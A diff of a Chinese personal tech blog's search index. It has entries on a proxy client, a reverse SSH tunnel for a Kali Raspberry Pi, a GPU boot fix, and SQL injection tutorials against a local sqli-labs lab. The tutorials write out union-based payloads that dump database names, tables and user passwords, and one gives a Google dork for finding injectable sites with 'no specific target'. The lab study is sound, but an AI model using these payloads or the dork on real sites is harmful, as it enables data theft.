@@ -1,369 +1,207 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>linux版qv2ray安装</title>
-    <url>/2020/08/27/linux%E7%89%88qv2ray%E5%AE%89%E8%A3%85/</url>
-    <content><![CDATA[<p>在国内有的网络技术文档都已经很老了，在外国能查看到新的互联网技术进行学习<br>废话不多说</p>
-<ol>
-<li>下载V2ray客户端<br> 应为github下载的比较慢，我下载好的放到了蓝奏云里面，蓝奏云下载的快<br> <a href="https://wwa.lanzous.com/iIatmf0cmqf">https://wwa.lanzous.com/iIatmf0cmqf</a><br> 更多其他系统版本<br> <a href="https://github.com/Qv2ray/Qv2ray/releases/tag/v1.99.6">https://github.com/Qv2ray/Qv2ray/releases/tag/v1.99.6</a></li>
-<li>下载核心<br> 应为github下载的比较慢，我下载好的放到了蓝奏云里面，蓝奏云下载的快<br> <a href="https://wwa.lanzous.com/ixPOUf0cpyb">https://wwa.lanzous.com/ixPOUf0cpyb</a><br> 更多其他系统版本<br> <a href="https://github.com/v2fly/v2ray-core/releases">https://github.com/v2fly/v2ray-core/releases/</a></li>
-</ol>
-<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>我创建了一个v2ray文件夹里面是解压好的下载的核心和V2ray客户端<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200726184523611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<ol>
-<li><p>然后在终端输入运行<br> 给他执行权限</p>
- <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x .&#x2F;Qv2ray.v2.6.2.linux-x64.AppImage	 </span><br></pre></td></tr></table></figure>
-<p> 运行</p>
-</li>
-</ol>
-<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;Qv2ray.v2.6.2.linux-x64.AppImage	 </span><br></pre></td></tr></table></figure></code></pre>
-<ol start="2">
-<li>设置<br> 设置中文<br> 他默认是英文的<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200726192820628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
-</ol>
-<p><strong>添加核心</strong><br>上面下载的核心文件里面的执行文件<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200726194038573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>添加上面解压出来了的核心文件的根目录<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020072619422713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>解决显卡问题，kali启动死循环&quot; 5.921.261] nouveau 0000:01:00.0:&quot;</title>
+      <link href="/2020/08/27/%E8%A7%A3%E5%86%B3%E6%98%BE%E5%8D%A1%E9%97%AE%E9%A2%98%EF%BC%8Ckali%E5%90%AF%E5%8A%A8%E6%AD%BB%E5%BE%AA%E7%8E%AF%205.921.261%5D%20nouveau%200000:01:00.0:/"/>
+      <url>/2020/08/27/%E8%A7%A3%E5%86%B3%E6%98%BE%E5%8D%A1%E9%97%AE%E9%A2%98%EF%BC%8Ckali%E5%90%AF%E5%8A%A8%E6%AD%BB%E5%BE%AA%E7%8E%AF%205.921.261%5D%20nouveau%200000:01:00.0:/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我的笔记本是winodws10和kali双系统<br>启动kali出现死循环5.921.261] nouveau 0000:01:00.0: fifo: SCHED_ERROR 06 ，就算重新装kali也是这个问题 ，根本就进不去系统,研究了多个深夜，<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511105630754.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70"></p><p>我花了很长时间琢磨摸索研究是什么问题，终于叫这个问题给解决了</p><h2 id="摸索过程"><a href="#摸索过程" class="headerlink" title="摸索过程"></a>摸索过程</h2><p>，win10独立显卡驱动安装不上就算是安装上了，也不能用，报43错误，官方最新驱动以前的老驱动，重做系统，win10还是这样，我估计是独立显卡坏了，</p><p>，启动kali无线<strong>5.921.261] nouveau 0000:01:00.0: fifo: SCHED_ERROR 06</strong> ，是显卡驱动nouveau  ，<br>然后我在百度上找了很多资料，<br>刚开始kali是好的，然后突然就出现了这个问题，有大神说可能所引导没有安装好，从新安装kali，也是没有解决这个问题，我想可能是我的镜像有问题，我计算了他的值和官方的值一样，说明镜像是没有问题的，找了很多方法，还是没有解决，已经到了深夜了，我最后看了一篇文字，<a href="https://blog.csdn.net/yaorengjin0808/article/details/81613331">https://blog.csdn.net/yaorengjin0808/article/details/81613331</a> 用了这个方法发现可以进入系统了，应为kali2020系统GRUB内核参数有变动，下面是我研究了好长时间，</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ol><li><p>进入系统，叫你选系统的时候按e键，进入编辑模式，</p></li><li><p>在这里添加这串字符<code>nouveau.modeset=0;</code>，splash在前面也可以<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511105947952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   俺F10值启动发现就可以进入系统了<br>   <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511110429756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>添加GRUB添加内核参数<br>进入<code>sudo vim /etc/default/grub</code><br>添加这个<code>splash nouveau.modeset=0</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511110632400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70"><br>命令<code>update-grub</code></p><h2 id="解决这个问题参考了很多网上的资料，"><a href="#解决这个问题参考了很多网上的资料，" class="headerlink" title="解决这个问题参考了很多网上的资料，"></a>解决这个问题参考了很多网上的资料，</h2><h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2></li></ol>]]></content>
+      
+      
       <categories>
-        <category>代理</category>
+          
+          <category> 解决显卡问题 </category>
+          
       </categories>
-      <tags>
-        <tag>客户端代理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>树莓派，反向ssh，内网通过公网访问到其他内网</title>
-    <url>/2020/08/27/%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%8C%E5%8F%8D%E5%90%91ssh%EF%BC%8C%E5%86%85%E7%BD%91%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91%E8%AE%BF%E9%97%AE%E5%88%B0%E5%85%B6%E4%BB%96%E5%86%85%E7%BD%91/</url>
-    <content><![CDATA[<h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><h2 id="简单说"><a href="#简单说" class="headerlink" title="简单说"></a>简单说</h2><p>a内网，b公网，c内网<br>在c内网怎么访问到a的内网里面，就和访问c内网其他主机一样？<br> 我研究了好长时间问过学习过10多年的大佬，还有其他厉害的大佬，其他人给的建议，和书籍还有百度，下面我就进行一下内网穿透，反向隧道，<br> 应为我的笔记本内网穿透没有什么太大的用处 ，可以用花生壳内网穿透很简单。就不多说了<br> 都是树莓派就不行了，如果进行，没有远程ssh就不行了，不能进行渗透测试，<br> 开始操作<br>在《树莓派渗透实战》书说的如果从外网访问内网，是访问不了的，反向ssh隧道从内网就可以做到<br>内网执行的命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -fN -R 5555:localhost:22  root@公网ip</span><br></pre></td></tr></table></figure>
-
-<p>服务器执行的命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@localhost -p5555</span><br></pre></td></tr></table></figure>
-
-<h2 id="树莓派安装的是kali-linux系统-安装花生壳树莓派，"><a href="#树莓派安装的是kali-linux系统-安装花生壳树莓派，" class="headerlink" title="树莓派安装的是kali linux系统 安装花生壳树莓派，"></a>树莓派安装的是kali linux系统 安装花生壳树莓派，</h2><p>花生壳地址<a href="https://hsk.oray.com/download/">https://hsk.oray.com/download/</a><br>应为树莓派我安装的arm64位的，他只有32位的，安装不上<br>下面命令对32位的支持</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg --add-architecture armhf</span><br></pre></td></tr></table></figure>
-<p>反正还是安装不是，不知道怎么回事<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200604210928493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="树莓派用Sunny-Ngrok内网穿透"><a href="#树莓派用Sunny-Ngrok内网穿透" class="headerlink" title="树莓派用Sunny-Ngrok内网穿透"></a>树莓派用Sunny-Ngrok内网穿透</h2><p>官方<a href="http://www.ngrok.cc/">http://www.ngrok.cc/</a><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060421113237.png" alt="在这里插入图片描述"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;sunny clientid  隧道id</span><br></pre></td></tr></table></figure>
-
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200604211248679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>自启动<a href="http://www.ngrok.cc/">http://www.ngrok.cc/</a>官方说明</p>
-<h2 id="1、下载客户端"><a href="#1、下载客户端" class="headerlink" title="1、下载客户端"></a>1、下载客户端</h2><p>这一步就都不用说了大家都知道怎么操作。下载完成之后将客户端执行文件移动到 /use/local/bin 目录下并给予可执行权限。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mv sunny &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sunny</span><br><span class="line">sudo chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sunny</span><br></pre></td></tr></table></figure>
-<h2 id="2、编写启动脚本"><a href="#2、编写启动脚本" class="headerlink" title="2、编写启动脚本"></a>2、编写启动脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;init.d&#x2F;sunny 启动脚本代码</span><br></pre></td></tr></table></figure>
-<p>把代码里面的【隧道id】替换成自己的隧道id</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh -e</span><br><span class="line">### BEGIN INIT INFO</span><br><span class="line"># Provides:          ngrok.cc</span><br><span class="line"># Required-Start:    $network $remote_fs $local_fs</span><br><span class="line"># Required-Stop:     $network $remote_fs $local_fs</span><br><span class="line"># Default-Start:     2 3 4 5</span><br><span class="line"># Default-Stop:      0 1 6</span><br><span class="line"># Short-Description: autostartup of frp for Linux</span><br><span class="line">### END INIT INFO</span><br><span class="line"></span><br><span class="line">NAME&#x3D;sunny</span><br><span class="line">DAEMON&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;$NAME</span><br><span class="line">PIDFILE&#x3D;&#x2F;var&#x2F;run&#x2F;$NAME.pid</span><br><span class="line"></span><br><span class="line">[ -x &quot;$DAEMON&quot; ] || exit 0</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">  start)</span><br><span class="line">      if [ -f $PIDFILE ]; then</span><br><span class="line">        echo &quot;$NAME already running...&quot;</span><br><span class="line">        echo -e &quot;\033[1;35mStart Fail\033[0m&quot;</span><br><span class="line">      else</span><br><span class="line">        echo &quot;Starting $NAME...&quot;</span><br><span class="line">        start-stop-daemon -S -p $PIDFILE -m -b -o -q -x $DAEMON -- clientid 隧道id || return 2</span><br><span class="line">        echo -e &quot;\033[1;32mStart Success\033[0m&quot;</span><br><span class="line">    fi</span><br><span class="line">    ;;</span><br><span class="line">  stop)</span><br><span class="line">        echo &quot;Stoping $NAME...&quot;</span><br><span class="line">        start-stop-daemon -K -p $PIDFILE -s TERM -o -q || return 2</span><br><span class="line">        rm -rf $PIDFILE</span><br><span class="line">        echo -e &quot;\033[1;32mStop Success\033[0m&quot;</span><br><span class="line">    ;;</span><br><span class="line">  restart)</span><br><span class="line">    $0 stop &amp;&amp; sleep 2 &amp;&amp; $0 start</span><br><span class="line">    ;;</span><br><span class="line">  *)</span><br><span class="line">    echo &quot;Usage: $0 &#123;start|stop|restart&#125;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="3、测试可执行代码"><a href="#3、测试可执行代码" class="headerlink" title="3、测试可执行代码"></a>3、测试可执行代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo chmod 755 &#x2F;etc&#x2F;init.d&#x2F;sunny</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny start</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny start    #启动</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny stop     #停止</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny restart  #重启</span><br></pre></td></tr></table></figure>
-<h2 id="4、设置开机启动"><a href="#4、设置开机启动" class="headerlink" title="4、设置开机启动"></a>4、设置开机启动</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cd /etc/init.d</span><br><span class="line">sudo update-rc.d sunny defaults <span class="number">90</span>    <span class="comment">#加入开机启动</span></span><br><span class="line">sudo update-rc.d -f sunny remove  <span class="comment">#取消开机启动</span></span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060422195522.png" alt="在这里插入图片描述"></p>
-<h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
+      
+      
+        <tags>
+            
+            <tag> 解决显卡问题 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>2. 网易web安全渗透  union联合查询注入</title>
+      <link href="/2020/08/27/2.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%20%20union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/"/>
+      <url>/2020/08/27/2.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%20%20union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h2 id="1-sql-union操作符"><a href="#1-sql-union操作符" class="headerlink" title="1. sql union操作符"></a>1. sql union操作符</h2><p>union操作符是用于，并合两个或者多个select语句的结果<br><strong>注意,union内部的 select语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时,每条 select语句中的列的顺序必须相同</strong><br>默认情况,union操作符选取不同的值。如果允许重复的值,请使用 union ALL.。</p><h2 id="2-注入应用场景"><a href="#2-注入应用场景" class="headerlink" title="2. 注入应用场景"></a>2. 注入应用场景</h2><ol><li>只有最后一个 SELECT子句允许有 ORDER BY;</li><li>只有最后一个 SELECT子句允许有uMT;</li><li>只要UNON连接的几个查询的字段数一样且列的数据类型转换没有问题,就可以查询出结果</li><li>注入点页面有回显;</li></ol><h2 id="sql注入流程图-，下面就按照上面的流程进行注入"><a href="#sql注入流程图-，下面就按照上面的流程进行注入" class="headerlink" title="sql注入流程图 ，下面就按照上面的流程进行注入"></a>sql注入流程图 ，下面就按照上面的流程进行注入</h2><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730171110963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="1-ORDER-BY-判断列数"><a href="#1-ORDER-BY-判断列数" class="headerlink" title="1.ORDER BY 判断列数"></a>1.ORDER BY 判断列数</h3><p>ORDER BY 是用来排序的<br>        进行排序这个ORDER BY 关键字经常用于sql注入的时候，根据错误，判断有几个表<br>        列下面有6个表<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200523185903455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>        <strong>判断有几个表</strong><br>        ORDER BY 7就报错了，应为他只有6个表<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200523190036955.png" alt="在这里插入图片描述"><br>        ORDER BY 6就对了<br>        <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200523190259569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70"><br><strong>用sqli-labs进行测试</strong><br>输入4发现就报错了,那这样就判断出来，字段是有3个<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730173055957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="2-观察页面返回，选择可以显示数据的位置，进行下一步的注入"><a href="#2-观察页面返回，选择可以显示数据的位置，进行下一步的注入" class="headerlink" title="2. 观察页面返回，选择可以显示数据的位置，进行下一步的注入"></a>2. 观察页面返回，选择可以显示数据的位置，进行下一步的注入</h3><p>我们输入<br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union%20 select 1,2,3 --+</code><br>判断注入的位置上2和3</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730173813841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>执行的sql语句结果就是这个<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730173958524.png" alt="在这里插入图片描述"></p><h3 id="3读取库的信息"><a href="#3读取库的信息" class="headerlink" title="3读取库的信息"></a>3读取库的信息</h3><p>输入的URL<code>http://192.168.0.104/Less-2/ ?id= -1 union  select 1,user(),3 --+</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730174451652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="4-读取数据"><a href="#4-读取数据" class="headerlink" title="4.读取数据"></a>4.读取数据</h3><h4 id="1-查看数据库名"><a href="#1-查看数据库名" class="headerlink" title="1.查看数据库名"></a>1.查看数据库名</h4><p>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select schema_name from information_schema.schemata   LIMIT 0,1),3 --+</code><br><strong>上面的URL介绍</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure><p>这个的意思在上一个博客查看<a href="https://blog.csdn.net/qq_41860876/article/details/106837536">1. 网易web安全渗透 手动sql注入</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 0,1</span><br></pre></td></tr></table></figure><p>用于查看行数，应为他只能显示一个，所以输出也只能一个<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730181715462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看其他下一个数据库</p><p>URL<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select schema_name from information_schema.schemata   LIMIT 1,1),3 --+</code><br>结果<br>只要修改<code>LIMIT 0,1</code>改成1就可以了<br>可以看到显示出来了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730181935785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>1.2读取全部的库</strong><br>上面输出一个不太好<br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code><br>用到了group_concat()函数，<br>应为有很多数据库他只能显示一个，所以用group_concat()叫所以库名都显示到一列中<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730175714834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="2-读取查表"><a href="#2-读取查表" class="headerlink" title="2.读取查表"></a>2.读取查表</h4><p>通过上面的查询找到数据库全部的数据库名<br>通过数据库名就可以查询表了</p><p>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 --+</code></p><p>URL介绍</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure><p>这个的意思在上一个博客查看<a href="https://blog.csdn.net/qq_41860876/article/details/106837536">1. 网易web安全渗透 手动sql注入</a><br>用<code>group_concat()</code>叫所以库名都显示到一列中<br>结果<br>叫表给显示出来了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730184527355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="3-查询列"><a href="#3-查询列" class="headerlink" title="3.查询列"></a>3.查询列</h4><p>通过上面的查询查询出来了库和表<br>通过上面的表查询列<br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3 --+</code><br>URL介绍</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure><p>这个的意思在上一个博客查看<a href="https://blog.csdn.net/qq_41860876/article/details/106837536">1. 网易web安全渗透 手动sql注入</a><br>用<code>group_concat()</code>叫所以库名都显示到一列中<br>结果<br>查看出来列了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730190143774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="4-读取数据-1"><a href="#4-读取数据-1" class="headerlink" title="4.读取数据"></a>4.读取数据</h4><p>通过上面的注入，知道了库，表，列<br>知道了全部就可以查询数据了<br>用这个<code>select 列名 from 库名.表名</code><br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(password) from security.users),3 --+</code><br>结果<br>通过注入叫数据给输出出来了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730191432156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
+      
+      
       <categories>
-        <category>内网穿透</category>
+          
+          <category> sql注入 </category>
+          
       </categories>
-      <tags>
-        <tag>隧道</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1. 网易web安全渗透  手动sql注入</title>
-    <url>/2020/08/27/1.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%20%20%E6%89%8B%E5%8A%A8sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ol>
-<li><p>靶场环境搭建</p>
-<p> 环境环境搭建服务器软件是phpstudy下载地址<a href="https://www.xp.cn/">https://www.xp.cn/</a><br> 靶场是sqli-labs下载地址是<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br> 配置sqli-labs的sql密码<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719151133673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p> 用php5和mysql5.7<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020071915101782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p> 成功<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719153932929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在1这里插入图片描述"></p>
-</li>
-</ol>
-<ol start="2">
-<li><p>注入的常用的函数</p>
- <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select system_user();      系统用户名 </span><br><span class="line">select  user(); 　　当前数据库用户名</span><br><span class="line">select  current_user(); 　　当前用户名</span><br></pre></td></tr></table></figure>
-
-
-</li>
-</ol>
-<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select  database();  返回当前使用的数据库</span><br></pre></td></tr></table></figure>
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20200623084124884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)
-
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select	version() mysql; 　　数据库版本</span><br><span class="line">select @@datadir;     数据库路径</span><br><span class="line">select @@basedir;  数据库安装路径</span><br><span class="line">select @@global.version_compile_os;  操作系统的信息</span><br></pre></td></tr></table></figure></code></pre>
-<ol start="3">
-<li>寻找注入点<br> 无特定目标 </li>
-</ol>
-<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:php?id&#x3D;</span><br></pre></td></tr></table></figure>
